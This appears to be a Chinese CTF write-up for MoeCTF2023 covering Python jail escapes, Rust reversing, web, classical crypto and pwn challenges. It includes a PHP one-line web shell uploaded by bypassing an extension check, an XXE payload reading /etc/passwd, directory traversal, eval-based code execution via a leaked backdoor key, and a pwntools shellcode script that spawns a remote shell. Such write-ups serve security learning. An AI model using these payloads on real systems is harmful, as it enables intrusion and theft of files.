<h2 id="jail-level-6"><a href="#jail-level-6" class="headerlink" title="jail level 6"></a>jail level 6</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Welcome to the MoeCTF2023 Jail challenge.It&#x27;s time to work on this calc challenge.&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Enter your expression and I will evaluate it for you.&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func_filter</span>(<span class="params">s</span>):</span><br><span class="line">  not_allowed = <span class="built_in">set</span>(<span class="string">&#x27;&quot;&#x27;</span>`bic+<span class="string">&#x27;)</span></span><br><span class="line"><span class="string">  return any(c in not_allowed for c in s)</span></span><br><span class="line"><span class="string">user_input_data = input(&quot;&gt; &quot;)</span></span><br><span class="line"><span class="string">if func_filter(user_input_data):</span></span><br><span class="line"><span class="string">  print(&quot;Oh hacker! Bye~&quot;)</span></span><br><span class="line"><span class="string">  exit(0)</span></span><br><span class="line"><span class="string">if not user_input_data.isascii():</span></span><br><span class="line"><span class="string">  print(&quot;Sorry we only ascii for this chall!&quot;)</span></span><br><span class="line"><span class="string">  exit(0)</span></span><br><span class="line"><span class="string">print(&#x27;</span>Answer result: &#123;&#125;<span class="string">&#x27;.format(eval(user_input_data)))</span></span><br></pre></td></tr></table></figure>



<h2 id="Leak-Level-0"><a href="#Leak-Level-0" class="headerlink" title="Leak Level 0"></a>Leak Level 0</h2><blockquote>
<p>global ()和 locals ()函数</p>
<p>使用global ()可以获取Python中的全局变量；</p>
<p>使用locals ()可以获取Python中的局部变量；</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">    fake_key_into_local_but_valid_key_into_remote = <span class="string">&quot;moectfisbestctfhopeyoulikethat&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Hey Guys,Welcome to the moeleak challenge.Have fun!.&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;| Options: </span></span><br><span class="line"><span class="string">|	[V]uln </span></span><br><span class="line"><span class="string">|	[B]ackdoor&quot;</span>)</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">func_filter</span>(<span class="params">s</span>):</span><br><span class="line">      not_allowed = <span class="built_in">set</span>(<span class="string">&#x27;vvvveeee&#x27;</span>)</span><br><span class="line">      <span class="keyword">return</span> <span class="built_in">any</span>(c <span class="keyword">in</span> not_allowed <span class="keyword">for</span> c <span class="keyword">in</span> s)</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">      challenge_choice = <span class="built_in">input</span>(<span class="string">&quot;&gt;&gt;&gt; &quot;</span>).lower().strip()</span><br><span class="line">      <span class="keyword">if</span> challenge_choice == <span class="string">&#x27;v&#x27;</span>:</span><br><span class="line">        code = <span class="built_in">input</span>(<span class="string">&quot;code &gt;&gt; &quot;</span>)</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">len</span>(code)&gt;<span class="number">9</span>):</span><br><span class="line">          <span class="built_in">print</span>(<span class="string">&quot;you&#x27;re hacker!&quot;</span>)</span><br><span class="line">          exit(<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">if</span> func_filter(code):</span><br><span class="line">          <span class="built_in">print</span>(<span class="string">&quot;Oh hacker! byte~&quot;</span>)</span><br><span class="line">          exit(<span class="number">0</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">eval</span>(code))</span><br><span class="line">      <span class="keyword">elif</span> challenge_choice == <span class="string">&#x27;b&#x27;</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Please enter the admin key&quot;</span>)</span><br><span class="line">        key = <span class="built_in">input</span>(<span class="string">&quot;key &gt;&gt; &quot;</span>)</span><br><span class="line">        <span class="keyword">if</span>(key == fake_key_into_local_but_valid_key_into_remote):</span><br><span class="line">          <span class="built_in">print</span>(<span class="string">&quot;Hey Admin,please input your code:&quot;</span>)</span><br><span class="line">          code = <span class="built_in">input</span>(<span class="string">&quot;backdoor &gt;&gt; &quot;</span>)</span><br><span class="line">          <span class="built_in">print</span>(<span class="built_in">eval</span>(code))</span><br><span class="line">      <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;You should select valid choice!&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>基础的泄露题，看到他限制了不能使用函数，且V函数里的code长度不能大于9，</p>
<p>那么我们已知key是全局变量，那我们首先V然后使用global()函数找到真实的key，然后再用B函数进行一句话RCE</p>
<p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.3xkm16wsss20.png"></p>
<h2 id="Leak-Level-1"><a href="#Leak-Level-1" class="headerlink" title="Leak Level 1"></a>Leak Level 1</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">    fake_key_into_local_but_valid_key_into_remote = <span class="string">&quot;moectfisbestctfhopeyoulikethat&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Hey Guys,Welcome to the moeleak challenge.Have fun!.&quot;</span>)</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">func_filter</span>(<span class="params">s</span>):</span><br><span class="line">      not_allowed = <span class="built_in">set</span>(<span class="string">&#x27;moe_dbt&#x27;</span>)</span><br><span class="line">      <span class="keyword">return</span> <span class="built_in">any</span>(c <span class="keyword">in</span> not_allowed <span class="keyword">for</span> c <span class="keyword">in</span> s)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;| Options: </span></span><br><span class="line"><span class="string">|	[V]uln </span></span><br><span class="line"><span class="string">|	[B]ackdoor&quot;</span>)</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">      challenge_choice = <span class="built_in">input</span>(<span class="string">&quot;&gt;&gt;&gt; &quot;</span>).lower().strip()</span><br><span class="line">      <span class="keyword">if</span> challenge_choice == <span class="string">&#x27;v&#x27;</span>:</span><br><span class="line">        code = <span class="built_in">input</span>(<span class="string">&quot;code &gt;&gt; &quot;</span>)</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">len</span>(code)&gt;<span class="number">6</span>):</span><br><span class="line">          <span class="built_in">print</span>(<span class="string">&quot;you&#x27;re hacker!&quot;</span>)</span><br><span class="line">          exit(<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">if</span> func_filter(code):</span><br><span class="line">          <span class="built_in">print</span>(<span class="string">&quot;Oh hacker! byte~&quot;</span>)</span><br><span class="line">          exit(<span class="number">0</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">eval</span>(code))</span><br><span class="line">      <span class="keyword">elif</span> challenge_choice == <span class="string">&#x27;b&#x27;</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Please enter the admin key&quot;</span>)</span><br><span class="line">        key = <span class="built_in">input</span>(<span class="string">&quot;key &gt;&gt; &quot;</span>)</span><br><span class="line">        <span class="keyword">if</span>(key == fake_key_into_local_but_vailed_key_into_remote):</span><br><span class="line">          <span class="built_in">print</span>(<span class="string">&quot;Hey Admin,please input your code:&quot;</span>)</span><br><span class="line">          code = <span class="built_in">input</span>(<span class="string">&quot;backdoor &gt;&gt; &quot;</span>)</span><br><span class="line">          <span class="built_in">print</span>(<span class="built_in">eval</span>(code))</span><br><span class="line">      <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;You should select valid choice!&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>我们可以看到第一个限制长度变成了6，而且还是有函数过滤，那么我还是使用unicode编码的方式绕过过滤</p>
<blockquote>
<p>输入法的全角输入就是unicode编码</p>
</blockquote>
<p>我们使用unicode编码输入一个help()，函数，然后输入__main__，查看全局变量</p>
<p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.4kgd10c9cmc0.webp"></p>
<p>得到正常的key就可以去愉快的一句话RCE了</p>
<h2 id="Leak-Level-2"><a href="#Leak-Level-2" class="headerlink" title="Leak Level 2"></a>Leak Level 2</h2><p>和leak1一样的，没过滤help(),直接使用help（）获取key然后获取flag</p>
<p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.39u5399sj2k0.webp"></p>
<h1 id="AI"><a href="#AI" class="headerlink" title="AI"></a>AI</h1><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/Bluebro/article/details/127161165">pytorch超详细安装教程，Anaconda、PyTorch和PyCharm整套安装流程_pytorch安装-CSDN博客</a></p>
<p>安装了环境，但东西很新，目前没有很多精力，以后再说</p>
<h1 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h1><h2 id="RUST"><a href="#RUST" class="headerlink" title="RUST"></a>RUST</h2><p>第一次接触rust逆向，安装环境安装了好久，最后发现还是GPT好用</p>
<p>我们需要安装一个rust的IDA插件，那样会更加直观：IDARustDemangler</p>
<p>首先下载这个插件前我们需要有RUST环境，有了RUST环境后就可以使用cargo进行编译rs-dml，运行起IDARustDemangler.py</p>
<p>这里放上两个链接，可以自行下载</p>
<p><a target="_blank" rel="noopener" href="https://github.com/timetravelthree/IDARustDemangler">timetravelthree&#x2F;IDARustDemangler: Rust Demangler &amp; Normalizer plugin for IDA (github.com)</a></p>
<p><a target="_blank" rel="noopener" href="https://www.rust-lang.org/zh-CN/tools/install">安装 Rust - Rust 程序设计语言 (rust-lang.org)</a></p>
<p>我安装时的误会，安装完成RUST后，rs-dml会让你执行</p>
<p>cargo build –xxxxx</p>
<p>这个其实是rs-dml github上的，下载下来后，在那个目录执行那个命令就可以，记得最后要把编译出来的rs-dml添加到环境变量中去</p>
<p>可以看一下没用插件和用插件之前的区别,很明显他会帮你解散 Rust 函数名称并将其规范化</p>
<p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.4fn9frtsv1u0.png"></p>
<p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.3h3ka2vwfmw0.webp"></p>
<p>那么我进行分析就简单了很多，但rust不愧是最安全的语言，基本也看不懂，最后我们在这里发现了异样，他对一个数据进行0x88异或，那么前面正好也有一个数据块，我们猜测既然是异或，那么a&#x3D;b^c，那么c&#x3D;a^b，所以我们直接写脚本进行解密即可</p>
<p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.epnkcgdi1lk.webp"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">a=[-<span class="number">27</span>, -<span class="number">25</span>, -<span class="number">19</span>, -<span class="number">21</span>, -<span class="number">4</span>, -<span class="number">18</span>, -<span class="number">13</span>, -<span class="number">38</span>, -<span class="number">3</span>, -<span class="number">5</span>, -<span class="number">4</span>, -<span class="number">41</span>, -<span class="number">6</span>, -<span class="number">19</span>, -<span class="number">2</span>, -<span class="number">41</span>, -<span class="number">1</span>, -<span class="number">31</span>, -<span class="number">28</span>, -<span class="number">28</span>, -<span class="number">41</span>, -<span class="number">22</span>, -<span class="number">19</span>, -<span class="number">41</span>, -<span class="number">23</span>, -<span class="number">1</span>, -<span class="number">18</span>, -<span class="number">3</span>, -<span class="number">71</span>, -<span class="number">11</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(a)):</span><br><span class="line">    a[i]^=<span class="number">0x88</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(a[i]%<span class="number">256</span>),end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure>



<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="http"><a href="#http" class="headerlink" title="http"></a>http</h2><p>1.use parameter: UwU&#x3D;u<br>2.post <strong>form</strong>: Luv&#x3D;u<br>3.use admin character<br>4.request from 127.0.0.1<br>5.use browser ‘MoeBrowser’</p>
<p>第一个条件和第二个条件直接在hackbar传参，第二个是修改cookie的值，第四个是由本地传输，最后一个是指定浏览器</p>
<p>X-Forwarded-For: 127.0.0.1<br>user-agent:MoeBrowser<br>Cookie: character&#x3D;admin</p>
<p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.3mxe1lqm8780.webp"></p>
<h2 id="彼岸的flag"><a href="#彼岸的flag" class="headerlink" title="彼岸的flag"></a>彼岸的flag</h2><p>直接去源码cttl+f 查找moectf即可</p>
<p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.2b4by3jjufa.png"></p>
<h2 id="cookie"><a href="#cookie" class="headerlink" title="cookie"></a>cookie</h2><p>一些api说明</p>
<p>注册 <code>POST /register</code></p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;username&quot;</span><span class="punctuation">:</span><span class="string">&quot;koito&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;password&quot;</span><span class="punctuation">:</span><span class="string">&quot;123456&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>登录 <code>POST /login</code></p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;username&quot;</span><span class="punctuation">:</span><span class="string">&quot;koito&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;password&quot;</span><span class="punctuation">:</span><span class="string">&quot;123456&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>获取flag <code>GET /flag</code></p>
<p>查询服务状态 <code>GET /status</code></p>
<p>根据他的提示我们得知，他是先让我们注册，然后登陆上去，登录后可以看可以看到flag的地方</p>
<p>谷歌的hackbar可以直接解析json的数据，然后post传输过去</p>
<p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.4l3ehlj1qrs0.webp"></p>
<p>传输过去后我们就已经注册成功了</p>
<h2 id="gas-gas-gas"><a href="#gas-gas-gas" class="headerlink" title="gas!gas!gas!"></a>gas!gas!gas!</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">session = requests.session()</span><br><span class="line">resTest = <span class="string">&#x27;弯道直行，保持这个速度&#x27;</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">10</span>):</span><br><span class="line">    <span class="comment"># resTest = &#x27;弯道直行，保持这个速度&#x27;</span></span><br><span class="line">    <span class="comment"># fx = &#123;-1:&#x27;左&#x27;,0:&#x27;直行&#x27;,1:&#x27;右&#x27;&#125;</span></span><br><span class="line">    <span class="comment"># ym = &#123;0:&#x27;松开&#x27;,1:&#x27;保持&#x27;,2:&#x27;全开&#x27;&#125;</span></span><br><span class="line">    url = <span class="string">&#x27;http://localhost:62655/&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;太大&quot;</span> <span class="keyword">in</span> resTest:</span><br><span class="line">        ym = <span class="number">2</span></span><br><span class="line">    <span class="keyword">elif</span> <span class="string">&quot;太小&quot;</span> <span class="keyword">in</span> resTest:</span><br><span class="line">        ym = <span class="number">0</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        ym = <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;向左&quot;</span> <span class="keyword">in</span> resTest:</span><br><span class="line">        fx = <span class="number">1</span></span><br><span class="line">    <span class="keyword">elif</span> <span class="string">&quot;向右&quot;</span> <span class="keyword">in</span> resTest:</span><br><span class="line">        fx = -<span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        fx = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    myData = &#123;  <span class="comment"># 构造的POST数据</span></span><br><span class="line">        <span class="string">&quot;driver&quot;</span>: <span class="string">&quot;11&quot;</span>,</span><br><span class="line">        <span class="string">&quot;steering_control&quot;</span>: fx,</span><br><span class="line">        <span class="string">&quot;throttle&quot;</span>: ym</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment"># 发送 POST 请求</span></span><br><span class="line">    response = session.post(url, data=myData)</span><br><span class="line">    content = response.text</span><br><span class="line">    <span class="comment"># 找寻指定字符串</span></span><br><span class="line">    start_index = content.find(<span class="string">&#x27;&lt;font color=&quot;red&quot;&gt;&#x27;</span>)</span><br><span class="line">    end_index = content.find(<span class="string">&quot;&lt;/font&gt;&lt;/h3&gt;&lt;/div&gt;&quot;</span>, start_index)</span><br><span class="line">    <span class="keyword">if</span> start_index != -<span class="number">1</span> <span class="keyword">and</span> end_index != -<span class="number">1</span>:</span><br><span class="line">        resTest = content[start_index + <span class="built_in">len</span>(<span class="string">&#x27;&lt;font color=&quot;red&quot;&gt;&#x27;</span>):end_index].strip()</span><br><span class="line">        <span class="built_in">print</span>(resTest)</span><br><span class="line">        <span class="comment"># print(response.text)</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;未找到指定的字符串&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(response.text)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;会话数据：&quot;</span>, session.cookies.get_dict())</span><br><span class="line">    time.sleep(<span class="number">0.5</span>)</span><br><span class="line">    <span class="comment"># session.cookies.get_dict()可以用于获取当前会话对象中的 cookies 数据，返回一个字典形式的 cookies 数据。</span></span><br><span class="line"><span class="comment"># print(response.text)</span></span><br><span class="line">session.close()</span><br></pre></td></tr></table></figure>



<h2 id="moe图床"><a href="#moe图床" class="headerlink" title="moe图床"></a>moe图床</h2><p>经典的文件上传</p>
<p>编写一个一句话木马文件，上传到对方的服务器，我们就可以使用蚁剑进行连接对面的后门</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line"><span class="meta">&lt;?=</span><span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;1&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>我们观察他的源代码，发现他只能上传后缀为png的文件，那我们就把这个文件后缀改为png，然后上传到对方的电脑，但一句话木马通常是php源码的格式，我们要执行他只能上传一个php后缀，所以我们在上传的时候，可以用burp进行抓包，然后修改他的后缀名，直接修改后缀名我们发现他是不可以传到对面的服务器的，那我们就在png的后面直接加上php后缀即可</p>
<p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.6cm88qnam5o0.png"></p>
<p>我们上传成功后就能看到他还贴心的给了我们地址，那么我直接蚁剑连接即可</p>
<p>可以在更目录发现flag</p>
<p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.xy90ifuyfn4.webp"></p>
<h2 id="了解你的座驾"><a href="#了解你的座驾" class="headerlink" title="了解你的座驾"></a>了解你的座驾</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/fengzilin1973/article/details/116355031">浅谈 XXE 漏洞任意文件读取_java xxe读取任意文件-CSDN博客</a></p>
<p>我们抓包发现了xml，那么我们猜测就是xxe漏洞，直接上网找wp</p>
<p>任意文件读取</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span><span class="meta">?&gt;</span>  </span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE xxe [ </span><br><span class="line">&lt;!ELEMENT name ANY &gt; </span><br><span class="line">&lt;!ENTITY xxe SYSTEM <span class="string">&quot;file:etc/passwd&quot;</span> &gt;]&gt; </span><br><span class="line">&lt;root&gt; </span><br><span class="line">&lt;name&gt;&amp;xxe;&lt;/name&gt; </span><br><span class="line">&lt;/root&gt; </span><br></pre></td></tr></table></figure>

<p>我们直接发包的时候发现是不可以，我们需要进行一下url编码才可以</p>
<p>burp里的情况</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">xml_content=&lt;!DOCTYPE xxe [ </span><br><span class="line">&lt;!ELEMENT name ANY &gt; </span><br><span class="line">&lt;!ENTITY xxe SYSTEM <span class="string">&quot;file:etc/passwd&quot;</span> &gt;]&gt; </span><br><span class="line">&lt;root&gt; </span><br><span class="line">&lt;name&gt;&amp;xxe;&lt;/name&gt; </span><br><span class="line">&lt;/root&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.539slc36hjk0.webp"></p>
<h2 id="大海捞针"><a href="#大海捞针" class="headerlink" title="大海捞针"></a>大海捞针</h2><p>直接扫码器burp爆破</p>
<p>我们可以先用？id&#x3D;1&#x2F;2&#x2F;3去看看这写页面都是什么，那么我们使用burp进行抓包就可以了</p>
<p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.rcgjxlmdfxc.webp"></p>
<p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.156e4evvp0dc.webp"></p>
<h2 id="meo图床"><a href="#meo图床" class="headerlink" title="meo图床"></a>meo图床</h2><p>题目其实骗人的，真正的考点是目录穿越，我们可以以etc&#x2F;passwd进行查证</p>
<p>我们先随意上传一个文件，他会让我们进行查看</p>
<p>我们成功找到了穿越的地点</p>
<p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.6yf32v4l2k80.webp"></p>
<p>然后我们在直接去访问flag，他提供了一个php文件，我们直接访问</p>
<p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.66dmrtb4xdo0.webp"></p>
<p>最后我们进行一下简单的md弱比较，就可以了</p>
<p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.7kikqsr971g0.webp"></p>
<h2 id="夺命十三枪"><a href="#夺命十三枪" class="headerlink" title="夺命十三枪"></a>夺命十三枪</h2><p>php反序列化字符串逃逸</p>
<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h1 id="Classical-Crypto"><a href="#Classical-Crypto" class="headerlink" title="Classical Crypto"></a>Classical Crypto</h1><h2 id="ezrot"><a href="#ezrot" class="headerlink" title="ezrot"></a>ezrot</h2><p>rot47解密</p>
<p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.75dyzhgenmc0.webp"></p>
<h2 id="可可的新围墙"><a href="#可可的新围墙" class="headerlink" title="可可的新围墙"></a>可可的新围墙</h2><p>栅栏密码，栏数为3</p>
<p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.2ban0s7byzrw.webp"></p>
<h2 id="皇帝的新密码"><a href="#皇帝的新密码" class="headerlink" title="皇帝的新密码"></a>皇帝的新密码</h2><p>凯撒偏移为7</p>
<p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.35v9q3am0wo0.webp"></p>
<h2 id="不是“皇帝的新密码”"><a href="#不是“皇帝的新密码”" class="headerlink" title="不是“皇帝的新密码”"></a>不是“皇帝的新密码”</h2><p>这个形式一看就是凯撒或者维吉尼亚，不是凯撒就是维吉尼亚了</p>
<p>我们先把密钥设置成moectf，解出开头goodjo的字符串</p>
<p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.68bfyu9qv240.webp"></p>
<p>所以我们猜测密钥是goodjob</p>
<p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.710x6km40ns0.webp"></p>
<h2 id="猫言喵语"><a href="#猫言喵语" class="headerlink" title="猫言喵语"></a>猫言喵语</h2><p>hit：Morse code</p>
<p>喵喵？为长码，喵喵喵为短码直接解密即可</p>
<p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.1y2yk0m3v0v4.webp"></p>
<h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="shellcode-level1"><a href="#shellcode-level1" class="headerlink" title="shellcode_level1"></a>shellcode_level1</h2><p>我们checksec发现保护全开，然后看他的题目描述是关于mmap和mprotect函数的，分析源码可以看到有两处关键的信息</p>
<blockquote>
<p>addr &#x3D; mmap(0LL, 0x64uLL, 3, 34, -1, 0LL);</p>
</blockquote>
<blockquote>
<p>mprotect(addr, 0x1000uLL, 7);</p>
</blockquote>
<p>第二局的意思就是在这个以addr这个地址开始，0x1000字节的地址都是可读可写可执行的，然后他是在case4里的，那么就好办了，我们选择case4后直接传入shellcode就可以了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># p = process(&#x27;./ezshellcode&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;....&#x27;</span>,<span class="number">55357</span>)</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line">shellcode = asm(shellcraft.sh()) <span class="comment">#生成并汇编shellcode</span></span><br><span class="line">target = <span class="number">0x66660000</span></span><br><span class="line">payload = shellcode</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;choose?&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="uninitialized-key"><a href="#uninitialized-key" class="headerlink" title="uninitialized_key"></a>uninitialized_key</h3><p>我们可以看到内存分布，v2就在v1下面，那我们输入第一个函数就可以了，</p>
<p>第二个传一个空值</p>
